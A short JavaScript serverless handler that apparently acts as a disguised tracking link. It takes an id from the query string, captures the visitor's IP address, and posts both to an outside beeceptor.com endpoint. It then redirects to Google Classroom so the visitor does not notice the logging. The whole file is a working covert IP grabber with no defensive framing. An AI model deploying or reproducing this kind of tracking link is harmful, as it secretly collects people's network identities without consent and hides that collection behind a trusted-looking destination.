export default async function handler(req, res) {
    const id = req.query.i;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    try {
        if(id){
        await fetch("https://asdkf.free.beeceptor.com", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ id: id, ip: ip})
        });
        }
    } catch (error) {
        return res.status(500).json({ error: "Failed to post data" });
    }
    
    res.writeHead(302, { Location: "https://classroom.google.com/h" });
    res.end();
}
